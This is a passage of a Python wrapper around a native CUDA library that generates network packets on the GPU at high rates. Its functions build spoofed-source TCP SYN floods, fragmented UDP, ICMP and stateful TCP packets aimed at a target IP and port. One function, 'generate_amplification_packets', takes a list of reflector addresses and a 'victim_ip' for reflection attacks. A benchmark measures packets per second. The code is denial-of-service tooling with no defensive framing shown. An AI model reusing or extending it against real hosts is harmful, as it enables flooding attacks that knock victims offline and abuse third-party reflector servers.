            out["compat_fallback_count"] = int(out.get("gpu_persistent_fallback_count", 0) or 0)
        telemetry = _stream_telemetry_snapshot()
        for key in (
            "gpu_kernel_mode_active",
            "persistent_runtime_restarts",
            "no_progress_events",
            "quota_stall",
            "queue_pressure",
            "ring_occupancy_peak",
            "bridge_drain_batches",
            "bridge_drain_packets",
            "ring_drop_events",
            "scheduler_fairness_cv_pct",
            "compat_fallback_count",
            "gpu_persistent_cmd_submitted",
            "gpu_persistent_cmd_completed",
            "gpu_persistent_errors",
        ):
            if key in telemetry:
                if key == "scheduler_fairness_cv_pct":
                    out[key] = max(float(out.get(key, 0.0) or 0.0), float(telemetry.get(key, 0.0) or 0.0))
                else:
                    out[key] = max(int(out.get(key, 0) or 0), int(telemetry.get(key, 0) or 0))
        return out
    except Exception:
        return {"raw": text}


def read_stream_stats_snapshot(stream_id: int | None = None) -> dict:
    if not _native_ready():
        _raise_native_policy_violation("read_stream_stats_snapshot")
    if not _supports_stream_lifecycle():
        raise GPUPacketError("native stream lifecycle API unavailable")
    stream_id_i = int(stream_id or 0)
    if hasattr(_LIB, "samurai_gpu_packet_read_stream_stats_snapshot"):
        snap = _PersistentStatsSnapshot()
        rc = int(
            _LIB.samurai_gpu_packet_read_stream_stats_snapshot(
                ctypes.c_int64(stream_id_i),
                ctypes.byref(snap),
            )
            or 0
        )
        if rc == 0:
            return {
                "stream_id": int(snap.stream_id),
                "gpu_kernel_mode_active": int(snap.kernel_mode),
                "runtime_active": int(snap.runtime_active),
                "submitted": int(snap.submitted),
                "completed": int(snap.completed),
                "quota_left": int(snap.quota_left),
                "persistent_tx_bridge_sent": int(snap.persistent_tx_bridge_sent),
                "persistent_produced": int(snap.persistent_produced),
                "queue_pressure": int(snap.queue_pressure),
                "ring_drop_events": int(snap.ring_drop_events),
                "scheduler_fairness_cv_pct": float(snap.scheduler_fairness_cv_pct),
                "no_progress_events": int(snap.no_progress_events),
                "persistent_runtime_restarts": int(snap.persistent_runtime_restarts),
                "quota_stall": int(snap.quota_stall),
                "bridge_drain_batches": int(snap.bridge_drain_batches),
                "bridge_drain_packets": int(snap.bridge_drain_packets),
                "ring_occupancy_peak": int(snap.ring_occupancy_peak),
                "compat_fallback_count": int(snap.compat_fallback_count),
                "persistent_bridge_ipg_ns": int(snap.persistent_bridge_ipg_ns),
                "max_packet_bytes": int(snap.max_packet_bytes),
            }
    # Backward compatibility path for older native library builds.
    if stream_id_i == 0:
        return read_stream_stats(0)
    out = dict(read_stream_stats(stream_id_i) or {})
    rt = dict(read_stream_stats(0) or {})
    if rt:
        out.update(
            {
                "persistent_tx_bridge_sent": int(rt.get("persistent_tx_bridge_sent", 0) or 0),
                "persistent_produced": int(rt.get("persistent_produced", 0) or 0),
                "queue_pressure": int(rt.get("queue_pressure", 0) or 0),
                "ring_drop_events": int(rt.get("ring_drop_events", 0) or 0),
                "scheduler_fairness_cv_pct": float(rt.get("scheduler_fairness_cv_pct", 0.0) or 0.0),
                "no_progress_events": int(rt.get("no_progress_events", 0) or 0),
                "persistent_runtime_restarts": int(rt.get("persistent_runtime_restarts", 0) or 0),
                "quota_stall": int(rt.get("quota_stall", 0) or 0),
                "bridge_drain_batches": int(rt.get("bridge_drain_batches", 0) or 0),
                "bridge_drain_packets": int(rt.get("bridge_drain_packets", 0) or 0),
                "ring_occupancy_peak": int(rt.get("ring_occupancy_peak", 0) or 0),
                "compat_fallback_count": int(rt.get("compat_fallback_count", 0) or 0),
                "persistent_bridge_ipg_ns": int(rt.get("persistent_bridge_ipg_ns", 0) or 0),
                "max_packet_bytes": int(rt.get("max_packet_bytes", 0) or 0),
            }
        )
    return out


def shutdown_persistent_runtime() -> None:
    if not _native_ready():
        _raise_native_policy_violation("shutdown_persistent_runtime")
    if not _supports_stream_lifecycle():
        return
    rc = int(_LIB.samurai_gpu_packet_shutdown_runtime() or 0)
    if rc != 0:
        _stream_telemetry_inc("gpu_persistent_errors", 1)
        _raise_native_error("samurai_gpu_packet_shutdown_runtime failed")


def generate_packets(
    count,
    target_ip,
    target_port,
    protocol="tcp",
    spoof_ip=True,
    real_src_ip="192.168.1.100",
    tcp_flags=0x02,
    has_ethernet=True,
    window=-1,
    stream=None,
    gateway_mac=0xFFFFFFFFFFFF,
    spoof_subnet="1.0.0.0/8",
    return_host_ready=True,
):
    stream_handle = _resolve_stream_handle("generate_packets", stream)
    if not _native_ready():
        _raise_native_policy_violation("generate_packets", stream=stream)
    out_ptr = ctypes.c_void_p()
    out_size = ctypes.c_size_t(0)
    out_packet_size = ctypes.c_int(0)
    rc = _LIB.samurai_gpu_packet_generate_packets(
        ctypes.c_int64(int(count)),
        ctypes.c_char_p(_as_bytes(target_ip)),
        ctypes.c_int64(int(target_port)),
        ctypes.c_char_p(_as_bytes(protocol, "tcp")),
        ctypes.c_int(1 if spoof_ip else 0),
        ctypes.c_char_p(_as_bytes(real_src_ip, "192.168.1.100")),
        ctypes.c_int64(int(tcp_flags)),
        ctypes.c_int(1 if has_ethernet else 0),
        ctypes.c_int64(int(window)),
        ctypes.c_uint64(int(stream_handle)),
        ctypes.c_uint64(int(gateway_mac)),
        ctypes.c_char_p(_as_bytes(spoof_subnet, "1.0.0.0/8")),
        ctypes.byref(out_ptr),
        ctypes.byref(out_size),
        ctypes.byref(out_packet_size),
    )
    if int(rc) != 0:
        _raise_native_error("samurai_gpu_packet_generate_packets failed")

    out = _materialize_native_output(
        out_ptr,
        int(out_size.value),
        pool_key="cuda_cpp:generate_packets",
        return_host_ready=bool(return_host_ready),
    )
    return out, int(out_packet_size.value)


def generate_packets_from_template(
    template_bytes,
    count,
    real_src_ip="192.168.1.100",
    spoof_ip=True,
    has_ethernet=True,
    stream=None,
    gateway_mac=0xFFFFFFFFFFFF,
    spoof_subnet="1.0.0.0/8",
    force_global_fallback=False,
    return_host_ready=True,
):
    stream_handle = _resolve_stream_handle("generate_packets_from_template", stream)
    if not _native_ready():
        _raise_native_policy_violation("generate_packets_from_template", stream=stream)
    template_arr = _coerce_numeric_array(
        template_bytes,
        np.uint8,
        cache_name="generate_packets_from_template:template",
    )
    if template_arr is None or int(template_arr.size) <= 0:
        raise ValueError("template_bytes must not be empty")
    tpl_ptr, tpl_len = _array_ptr(template_arr, ctypes.POINTER(ctypes.c_uint8))
    _native_track_h2d_copy(int(tpl_len))
    out_ptr = ctypes.c_void_p()
    out_size = ctypes.c_size_t(0)
    out_packet_size = ctypes.c_int(0)

    rc = _LIB.samurai_gpu_packet_generate_packets_from_template(
        tpl_ptr,
        ctypes.c_size_t(tpl_len),
        ctypes.c_int64(int(count)),
        ctypes.c_char_p(_as_bytes(real_src_ip, "192.168.1.100")),
        ctypes.c_int(1 if spoof_ip else 0),
        ctypes.c_int(1 if has_ethernet else 0),
        ctypes.c_uint64(int(stream_handle)),
        ctypes.c_uint64(int(gateway_mac)),
        ctypes.c_char_p(_as_bytes(spoof_subnet, "1.0.0.0/8")),
        ctypes.c_int(1 if force_global_fallback else 0),
        ctypes.byref(out_ptr),
        ctypes.byref(out_size),
        ctypes.byref(out_packet_size),
    )
    if int(rc) != 0:
        _raise_native_error("samurai_gpu_packet_generate_packets_from_template failed")

    out = _materialize_native_output(
        out_ptr,
        int(out_size.value),
        pool_key="cuda_cpp:generate_packets_from_template",
        return_host_ready=bool(return_host_ready),
    )
    return out, int(out_packet_size.value)


def generate_packets_from_template_pool(
    templates_bytes_list,
    count,
    target_ip,
    real_src_ip="192.168.1.100",
    spoof_ip=True,
    specific_src_port=-1,
    has_ethernet=True,
    stream=None,
    gateway_mac=0xFFFFFFFFFFFF,
    spoof_subnet="1.0.0.0/8",
    force_global_fallback=False,
    return_host_ready=True,
):
    stream_handle = _resolve_stream_handle("generate_packets_from_template_pool", stream)
    if not _native_ready():
        _raise_native_policy_violation("generate_packets_from_template_pool", stream=stream)
    flat, packet_size, num_templates = _flatten_templates(templates_bytes_list)
    if num_templates == 0:
        return None, 0
    flat_ptr, flat_len = _array_ptr(flat, ctypes.POINTER(ctypes.c_uint8))
    _native_track_h2d_copy(int(flat_len))
    out_ptr = ctypes.c_void_p()
    out_size = ctypes.c_size_t(0)
    out_packet_size = ctypes.c_int(0)

    rc = _LIB.samurai_gpu_packet_generate_packets_from_template_pool(
        flat_ptr,
        ctypes.c_size_t(flat_len),
        ctypes.c_int64(packet_size),
        ctypes.c_int64(num_templates),
        ctypes.c_int64(int(count)),
        ctypes.c_char_p(_as_bytes(target_ip)),
        ctypes.c_char_p(_as_bytes(real_src_ip, "192.168.1.100")),
        ctypes.c_int(1 if spoof_ip else 0),
        ctypes.c_int64(int(specific_src_port)),
        ctypes.c_int(1 if has_ethernet else 0),
        ctypes.c_uint64(int(stream_handle)),
        ctypes.c_uint64(int(gateway_mac)),
        ctypes.c_char_p(_as_bytes(spoof_subnet, "1.0.0.0/8")),
        ctypes.c_int(1 if force_global_fallback else 0),
        ctypes.byref(out_ptr),
        ctypes.byref(out_size),
        ctypes.byref(out_packet_size),
    )
    if int(rc) != 0:
        _raise_native_error("samurai_gpu_packet_generate_packets_from_template_pool failed")

    out = _materialize_native_output(
        out_ptr,
        int(out_size.value),
        pool_key="cuda_cpp:generate_packets_from_template_pool",
        return_host_ready=bool(return_host_ready),
    )
    return out, int(out_packet_size.value)


def generate_fragmented_packets(
    payload_bytes,
    count,
    target_ip,
    target_port,
    protocol="udp",
    spoof_ip=True,
    real_src_ip="192.168.1.100",
    has_ethernet=True,
    frag1_size=1500,
    frag2_size=1500,
    stream=None,
    gateway_mac=0xFFFFFFFFFFFF,
    spoof_subnet="1.0.0.0/8",
    return_host_ready=True,
):
    stream_handle = _resolve_stream_handle("generate_fragmented_packets", stream)
    if not _native_ready():
        _raise_native_policy_violation("generate_fragmented_packets", stream=stream)

    payload_arr = _coerce_numeric_array(
        payload_bytes,
        np.uint8,
        cache_name="generate_fragmented_packets:payload",
    )
    payload_ptr, payload_len = _array_ptr(payload_arr, ctypes.POINTER(ctypes.c_uint8))
    _native_track_h2d_copy(int(payload_len))

    out_ptr = ctypes.c_void_p()
    out_size = ctypes.c_size_t(0)
    out_packet_size = ctypes.c_int(0)
    rc = _LIB.samurai_gpu_packet_generate_fragmented_packets(
        payload_ptr,
        ctypes.c_size_t(payload_len),
        ctypes.c_int64(int(count)),
        ctypes.c_char_p(_as_bytes(target_ip)),
        ctypes.c_int64(int(target_port)),
        ctypes.c_char_p(_as_bytes(protocol, "udp")),
        ctypes.c_int(1 if spoof_ip else 0),
        ctypes.c_char_p(_as_bytes(real_src_ip, "192.168.1.100")),
        ctypes.c_int(1 if has_ethernet else 0),
        ctypes.c_int64(int(frag1_size)),
        ctypes.c_int64(int(frag2_size)),
        ctypes.c_uint64(int(stream_handle)),
        ctypes.c_uint64(int(gateway_mac)),
        ctypes.c_char_p(_as_bytes(spoof_subnet, "1.0.0.0/8")),
        ctypes.byref(out_ptr),
        ctypes.byref(out_size),
        ctypes.byref(out_packet_size),
    )
    if int(rc) != 0:
        _raise_native_error("samurai_gpu_packet_generate_fragmented_packets failed")

    out = _materialize_native_output(
        out_ptr,
        int(out_size.value),
        pool_key="cuda_cpp:generate_fragmented_packets",
        return_host_ready=bool(return_host_ready),
    )
    return out, int(out_packet_size.value)


def generate_amplification_packets(
    template_bytes,
    reflectors_ips,
    victim_ip,
    count,
    has_ethernet=True,
    stream=None,
    gateway_mac=0xFFFFFFFFFFFF,
    return_host_ready=True,
):
    stream_handle = _resolve_stream_handle("generate_amplification_packets", stream)
    if not _native_ready():
        _raise_native_policy_violation("generate_amplification_packets", stream=stream)

    if not reflectors_ips:
        raise ValueError("reflectors_ips must not be empty")

    template_arr = _coerce_numeric_array(
        template_bytes,
        np.uint8,
        cache_name="generate_amplification_packets:template",
    )
    if template_arr is None or int(template_arr.size) <= 0:
        raise ValueError("template_bytes must not be empty")
    tpl_ptr, tpl_len = _array_ptr(template_arr, ctypes.POINTER(ctypes.c_uint8))
    _native_track_h2d_copy(int(tpl_len))

    reflector_bytes = [_as_bytes(ip) for ip in reflectors_ips]
    reflectors_arr = (ctypes.c_char_p * len(reflector_bytes))(*reflector_bytes)

    out_ptr = ctypes.c_void_p()
    out_size = ctypes.c_size_t(0)
    out_packet_size = ctypes.c_int(0)
    rc = _LIB.samurai_gpu_packet_generate_amplification_packets(
        tpl_ptr,
        ctypes.c_size_t(tpl_len),
        reflectors_arr,
        ctypes.c_size_t(len(reflector_bytes)),
        ctypes.c_char_p(_as_bytes(victim_ip)),
        ctypes.c_int64(int(count)),
        ctypes.c_int(1 if has_ethernet else 0),
        ctypes.c_uint64(int(stream_handle)),
        ctypes.c_uint64(int(gateway_mac)),
        ctypes.byref(out_ptr),
        ctypes.byref(out_size),
        ctypes.byref(out_packet_size),
    )
    if int(rc) != 0:
        _raise_native_error("samurai_gpu_packet_generate_amplification_packets failed")

    out = _materialize_native_output(
        out_ptr,
        int(out_size.value),
        pool_key="cuda_cpp:generate_amplification_packets",
        return_host_ready=bool(return_host_ready),
    )
    return out, int(out_packet_size.value)


def generate_stateful_packets(
    templates_bytes_list,
    count,
    target_ip,
    spoof_ip=True,
    real_src_ip="192.168.1.100",
    specific_src_port=-1,
    has_ethernet=True,
    stream=None,
    gateway_mac=0xFFFFFFFFFFFF,
    spoof_subnet="1.0.0.0/8",
    seq_list=None,
    ack_list=None,
    state_list=None,
    actual_lengths=None,
    window_sizes=None,
    mss_values=None,
    ttls=None,
    force_global_fallback=False,
    return_host_ready=True,
):
    stream_handle = _resolve_stream_handle("generate_stateful_packets", stream)
    if not _native_ready():
        _raise_native_policy_violation("generate_stateful_packets", stream=stream)

    flat, packet_size, num_templates = _flatten_templates(templates_bytes_list)
    if num_templates == 0:
        return None
    flat_ptr, flat_len = _array_ptr(flat, ctypes.POINTER(ctypes.c_uint8))

    seq_arr = _coerce_numeric_array(seq_list, np.uint32, cache_name="stateful:seq")
    ack_arr = _coerce_numeric_array(ack_list, np.uint32, cache_name="stateful:ack")
    state_arr = _coerce_numeric_array(state_list, np.uint8, cache_name="stateful:state")
    lengths_arr = _coerce_numeric_array(actual_lengths, np.uint32, cache_name="stateful:lengths")
    wins_arr = _coerce_numeric_array(window_sizes, np.uint16, cache_name="stateful:wins")
    msss_arr = _coerce_numeric_array(mss_values, np.uint16, cache_name="stateful:mss")
    ttl_arr = _coerce_numeric_array(ttls, np.uint8, cache_name="stateful:ttl")

    seq_ptr, seq_len = _array_ptr(seq_arr, ctypes.POINTER(ctypes.c_uint32))
    ack_ptr, ack_len = _array_ptr(ack_arr, ctypes.POINTER(ctypes.c_uint32))
    state_ptr, state_len = _array_ptr(state_arr, ctypes.POINTER(ctypes.c_uint8))
    lengths_ptr, lengths_len = _array_ptr(lengths_arr, ctypes.POINTER(ctypes.c_uint32))
    wins_ptr, wins_len = _array_ptr(wins_arr, ctypes.POINTER(ctypes.c_uint16))
    msss_ptr, msss_len = _array_ptr(msss_arr, ctypes.POINTER(ctypes.c_uint16))
    ttl_ptr, ttl_len = _array_ptr(ttl_arr, ctypes.POINTER(ctypes.c_uint8))
    h2d_bytes = int(flat_len)
    if seq_arr is not None:
        h2d_bytes += int(seq_arr.nbytes)
    if ack_arr is not None:
        h2d_bytes += int(ack_arr.nbytes)
    if state_arr is not None:
        h2d_bytes += int(state_arr.nbytes)
    if lengths_arr is not None:
        h2d_bytes += int(lengths_arr.nbytes)
    if wins_arr is not None:
        h2d_bytes += int(wins_arr.nbytes)
    if msss_arr is not None:
        h2d_bytes += int(msss_arr.nbytes)
    if ttl_arr is not None:
        h2d_bytes += int(ttl_arr.nbytes)
    _native_track_h2d_copy(h2d_bytes)

    out_ptr = ctypes.c_void_p()
    out_size = ctypes.c_size_t(0)
    out_packet_size = ctypes.c_int(0)
    rc = _LIB.samurai_gpu_packet_generate_stateful_packets(
        flat_ptr,
        ctypes.c_size_t(flat_len),
        ctypes.c_int64(packet_size),
        ctypes.c_int64(num_templates),
        ctypes.c_int64(int(count)),
        ctypes.c_char_p(_as_bytes(target_ip)),
        ctypes.c_int(1 if spoof_ip else 0),
        ctypes.c_char_p(_as_bytes(real_src_ip, "192.168.1.100")),
        ctypes.c_int64(int(specific_src_port)),
        ctypes.c_int(1 if has_ethernet else 0),
        ctypes.c_uint64(int(stream_handle)),
        ctypes.c_uint64(int(gateway_mac)),
        ctypes.c_char_p(_as_bytes(spoof_subnet, "1.0.0.0/8")),
        seq_ptr,
        ctypes.c_size_t(seq_len),
        ack_ptr,
        ctypes.c_size_t(ack_len),
        state_ptr,
        ctypes.c_size_t(state_len),
        lengths_ptr,
        ctypes.c_size_t(lengths_len),
        wins_ptr,
        ctypes.c_size_t(wins_len),
        msss_ptr,
        ctypes.c_size_t(msss_len),
        ttl_ptr,
        ctypes.c_size_t(ttl_len),
        ctypes.c_int(1 if force_global_fallback else 0),
        ctypes.byref(out_ptr),
        ctypes.byref(out_size),
        ctypes.byref(out_packet_size),
    )
    if int(rc) != 0:
        _raise_native_error("samurai_gpu_packet_generate_stateful_packets failed")

    out = _materialize_native_output(
        out_ptr,
        int(out_size.value),
        pool_key="cuda_cpp:generate_stateful_packets",
        return_host_ready=bool(return_host_ready),
    )
    return out, int(out_packet_size.value)


def benchmark_template_generation_paths(
    template_bytes,
    count=200000,
    iterations=5,
    real_src_ip="192.168.1.100",
    spoof_ip=True,
    has_ethernet=True,
    gateway_mac=0xFFFFFFFFFFFF,
    spoof_subnet="1.0.0.0/8",
):
    if not _native_ready():
        _raise_native_policy_violation("benchmark_template_generation_paths")

    def _run(force_global_fallback: bool) -> dict[str, float | int]:
        durations: list[float] = []
        packet_size = 0
        for _ in range(max(1, int(iterations))):
            started = time.perf_counter()
            packets, packet_size = generate_packets_from_template(
                template_bytes=template_bytes,
                count=count,
                real_src_ip=real_src_ip,
                spoof_ip=spoof_ip,
                has_ethernet=has_ethernet,
                gateway_mac=gateway_mac,
                spoof_subnet=spoof_subnet,
                force_global_fallback=force_global_fallback,
                return_host_ready=True,
            )
            durations.append(time.perf_counter() - started)
            del packets
        mean_seconds = sum(durations) / float(len(durations))
        pps = float(count) / mean_seconds if mean_seconds > 0 else 0.0
        return {
            "avg_ms": mean_seconds * 1000.0,
            "pps": pps,
            "packet_size": int(packet_size),
            "iterations": int(len(durations)),
            "path": "global_memory" if force_global_fallback else "constant_memory",
        }

    constant_result = _run(force_global_fallback=False)
    global_result = _run(force_global_fallback=True)
    runs = [constant_result, global_result]

    return {
        "count": int(count),
        "iterations": int(iterations),
        "template_size": int(len(template_bytes)),
        "constant": constant_result,
        "global": global_result,
        "native_only": True,
        "runs": runs,
        "generation_telemetry": get_generation_telemetry(),
    }


def generate_icmp_packets(
    count,
    target_ip,
    real_src_ip="192.168.1.100",
    spoof_ip=True,
    has_ethernet=True,
    icmp_type=8,
    icmp_code=0,
    payload_size=56,
    stream=None,
    gateway_mac=0xFFFFFFFFFFFF,
    spoof_subnet="1.0.0.0/8",
    return_host_ready=True,
):
    stream_handle = _resolve_stream_handle("generate_icmp_packets", stream)
    if not _native_ready():
        _raise_native_policy_violation("generate_icmp_packets", stream=stream)

    out_ptr = ctypes.c_void_p()
    out_size = ctypes.c_size_t(0)
    out_packet_size = ctypes.c_int(0)
    rc = _LIB.samurai_gpu_packet_generate_icmp_packets(
        ctypes.c_int64(int(count)),
        ctypes.c_char_p(_as_bytes(target_ip)),
        ctypes.c_char_p(_as_bytes(real_src_ip, "192.168.1.100")),
        ctypes.c_int(1 if spoof_ip else 0),
        ctypes.c_int(1 if has_ethernet else 0),
        ctypes.c_int64(int(icmp_type)),
        ctypes.c_int64(int(icmp_code)),
        ctypes.c_int64(int(payload_size)),
        ctypes.c_uint64(int(stream_handle)),
        ctypes.c_uint64(int(gateway_mac)),
        ctypes.c_char_p(_as_bytes(spoof_subnet, "1.0.0.0/8")),
        ctypes.byref(out_ptr),
        ctypes.byref(out_size),
        ctypes.byref(out_packet_size),
    )
    if int(rc) != 0:
        _raise_native_error("samurai_gpu_packet_generate_icmp_packets failed")

    out = _materialize_native_output(
        out_ptr,
        int(out_size.value),
        pool_key="cuda_cpp:generate_icmp_packets",
        return_host_ready=bool(return_host_ready),
    )
    return out, int(out_packet_size.value)


def get_generation_telemetry() -> dict:
    out = {}
    native = _native_telemetry_snapshot()
    stream_rt = _stream_telemetry_snapshot()
    out.update(native)
    out.update(stream_rt)
    if _native_ready() and _supports_stream_lifecycle():
        try:
            runtime_stats = read_stream_stats(0)
        except Exception:
            runtime_stats = {}
        if isinstance(runtime_stats, dict):
            for key in (
                "gpu_kernel_mode_active",
                "persistent_runtime_restarts",
                "no_progress_events",
                "quota_stall",
                "queue_pressure",
                "ring_occupancy_peak",
                "bridge_drain_batches",
                "bridge_drain_packets",
                "ring_drop_events",
                "scheduler_fairness_cv_pct",
                "compat_fallback_count",
            ):
                if key in runtime_stats:
                    if key == "scheduler_fairness_cv_pct":
                        out[key] = float(runtime_stats.get(key, 0.0) or 0.0)
                    else:
                        out[key] = int(runtime_stats.get(key, 0) or 0)
    out["gpu_kernel_mode"] = get_kernel_mode() if _native_ready() else _kernel_mode_from_env()
    out["gpu_stream_api_mode"] = _stream_api_mode_from_env()
    out["gpu_native_copy_metrics_estimated"] = 1
    out["gpu_template_h2d_copy_count"] = int(out.get("gpu_template_h2d_copy_count", 0) or 0) + int(
        native.get("gpu_native_h2d_copy_count", 0) or 0
    )
    out["gpu_template_h2d_copy_bytes"] = int(out.get("gpu_template_h2d_copy_bytes", 0) or 0) + int(
        native.get("gpu_native_h2d_copy_bytes", 0) or 0
    )
    return out


def reset_generation_telemetry() -> None:
    _native_telemetry_reset()
    _stream_telemetry_reset()
    with _PY_POOL_TELEMETRY_LOCK:
        _PY_POOL_TELEMETRY["d2h_copy_count"] = 0
        _PY_POOL_TELEMETRY["d2h_copy_bytes"] = 0
        _PY_POOL_TELEMETRY["pool_hits"] = 0
        _PY_POOL_TELEMETRY["pool_misses"] = 0


def clear_generation_caches() -> None:
    with _HOST_INPUT_CACHE_LOCK:
        _HOST_INPUT_CACHE.clear()


def get_memory_pool():
    return _SIMPLE_MEMORY_POOL


def get_pinned_host_pool():
    return _SIMPLE_PINNED_POOL


def configure_pinned_host_pool(*args, **kwargs):
    max_mb = kwargs.get("max_mb")
    max_bytes = kwargs.get("max_bytes")
    if args:
        max_mb = args[0]
    if max_bytes is not None:
        _SIMPLE_PINNED_POOL.configure(int(max_bytes))
    elif max_mb is not None:
        _SIMPLE_PINNED_POOL.configure(int(max_mb) * 1024 * 1024)
    return None


def copy_gpu_to_host_pinned(gpu_arr, *args, **kwargs):
    if isinstance(gpu_arr, memoryview):
        return gpu_arr if gpu_arr.itemsize == 1 else gpu_arr.cast("B")
    if isinstance(gpu_arr, np.ndarray):
        if gpu_arr.dtype == np.uint8 and gpu_arr.ndim == 1 and gpu_arr.flags.c_contiguous:
            return gpu_arr
        flat = np.ravel(gpu_arr)
        if flat.dtype != np.uint8:
            if flat.dtype.itemsize == 1:
                flat = flat.view(np.uint8)
            else:
                flat = flat.astype(np.uint8, copy=False)
        if flat.flags.c_contiguous:
            return flat
        return np.ascontiguousarray(flat)
    if isinstance(gpu_arr, (bytes, bytearray)):
        return gpu_arr
    if cp is not None and isinstance(gpu_arr, cp.ndarray):
        arr = cp.asnumpy(gpu_arr).reshape(-1).view(np.uint8)
        with _PY_POOL_TELEMETRY_LOCK:
            _PY_POOL_TELEMETRY["d2h_copy_count"] = int(_PY_POOL_TELEMETRY["d2h_copy_count"]) + 1
            _PY_POOL_TELEMETRY["d2h_copy_bytes"] = int(_PY_POOL_TELEMETRY["d2h_copy_bytes"]) + int(arr.nbytes)
        return arr
    return np.asarray(gpu_arr, dtype=np.uint8).reshape(-1)


def get_pool_telemetry() -> dict:
    with _PY_POOL_TELEMETRY_LOCK:
        return {
            "gpu_pool": _SIMPLE_MEMORY_POOL.get_stats(),
            "pinned_host_pool": _SIMPLE_PINNED_POOL.get_stats(),
            "d2h_copy_count": int(_PY_POOL_TELEMETRY["d2h_copy_count"]),
            "d2h_copy_bytes": int(_PY_POOL_TELEMETRY["d2h_copy_bytes"]),
        }


def safe_kernel_launch(*args, **kwargs):
    # Native backend owns kernel launches; this is a no-op compatibility hook.
    return None


def check_gpu_available():
    if not _NATIVE_ENABLED:
        return False, "cuda_cpp native path disabled by env"
    if _LIB is None:
        return False, "libgpu_packet_cuda.so not found"
    return True, f"cuda_cpp native library ready: {_LIB_PATH.name}"


def get_gpu_info() -> dict:
    available, message = check_gpu_available()
    return {
        "available": bool(available),
        "message": str(message),
        "native_enabled": bool(_NATIVE_ENABLED),
        "library_path": str(_LIB_PATH),
        "library_loaded": bool(_LIB is not None),
        "policy": get_native_policy(),
    }


def is_gpu_available() -> bool:
    available, _message = check_gpu_available()
    return bool(available)
